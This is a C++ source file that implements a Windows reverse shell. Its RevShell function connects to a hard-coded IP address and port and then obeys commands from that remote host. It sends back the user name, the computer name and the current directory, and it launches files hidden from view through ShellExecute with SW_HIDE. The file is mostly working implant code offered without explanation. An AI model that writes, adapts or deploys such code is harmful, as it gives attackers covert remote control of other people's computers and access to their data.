#include "module.h"

void exec(char* returnval, int returnsize, char* fileexec)
{
	char *ptr = strtok(fileexec, "\n");
	auto hinstance = ShellExecute(NULL, "open", ptr, NULL, NULL, SW_HIDE);
	std::cout << "hinstance output: " << hinstance << std::endl;
	std::cout << "file exec: " << fileexec << std::endl;

    if (32 >= (unsigned long long)hinstance)
		strcat(returnval, "[x] Error executing command..\n");
	else
		strcat(returnval, "\n");
}

void whoami(char* returnval, int returnsize)
{
	DWORD bufferlen = 257;
	GetUserName(returnval, &bufferlen);
}

void hostname(char* returnval, int returnsize)
{
	DWORD bufferlen = 257;
	GetComputerName(returnval, &bufferlen);
}

void pwd(char* returnval, int returnsize)
{
	TCHAR tempvar[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, tempvar);
	strcat(returnval, (char*)tempvar);
}

void RevShell()
{
	WSADATA wsaver;

	WSAStartup(MAKEWORD(2, 2), &wsaver);
	SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("192.168.206.130");
	addr.sin_port = htons(8080);

	if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		std::cout << "connect error...." << std::endl;

		closesocket(tcpsock);
		WSACleanup();
		exit(0);
	}
	else
	{
		std::cout << "Connect Success!" << std::endl;

		char CommandReceived[DEFAULT_BUFLEN];
		while(true)
		{
			int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
            // std::cout << "Command received: " << CommandReceived;
            // std::cout << "Length of Command received: " << Result << " " << strlen(CommandReceived) << std::endl;
			if((strcmp(CommandReceived, "whoami\n") == 0))
			{
				char buffer[257] = "";
				whoami(buffer, 257);
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer) + 1, 0);
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			}
			else if(strcmp(CommandReceived, "hostname\n") == 0)
			{
				char buffer[257] = "";
				hostname(buffer, 257);
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer) + 1, 0);
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			}
			else if(strcmp(CommandReceived, "pwd\n") == 0)
			{
				char buffer[257] = "";
				pwd(buffer, 257);
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer) + 1, 0);
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			}
			else if(strcmp(CommandReceived, "exit\n") == 0)
			{
				closesocket(tcpsock);
				WSACleanup();
				exit(0);
			}
			else
			{
				char splitval[DEFAULT_BUFLEN] = "";
				for(int i = 0; i < (*(&CommandReceived + 1) - CommandReceived); i++)
				{
					if(CommandReceived[i] == *" ")
						break;
					else
						splitval[i] = CommandReceived[i];
				}
				if(strcmp(splitval, "exec") == 0)
				{
					char CommandExec[DEFAULT_BUFLEN] = "";
					int j = 0;
					for(int i = 5; i < (*(&CommandReceived + 1) - CommandReceived); i++)
					{
						CommandExec[j] = CommandReceived[i];
						++j;
					}
					char buffer[257] = "";
					exec(buffer, 257, CommandExec);
					strcat(buffer,"\n");
					send(tcpsock, buffer, strlen(buffer) + 1, 0);
					memset(buffer, 0, sizeof(buffer));
					memset(CommandReceived, 0, sizeof(CommandReceived));
				}
				else
				{
					char buffer[257] = "Invalid Command\n";
					send(tcpsock, buffer, strlen(buffer) + 1, 0);
					memset(buffer, 0, sizeof(buffer));
					memset(CommandReceived, 0, sizeof(CommandReceived));
				}
			}
		}
	}

	closesocket(tcpsock);
	WSACleanup();
	exit(0);
	
	
}
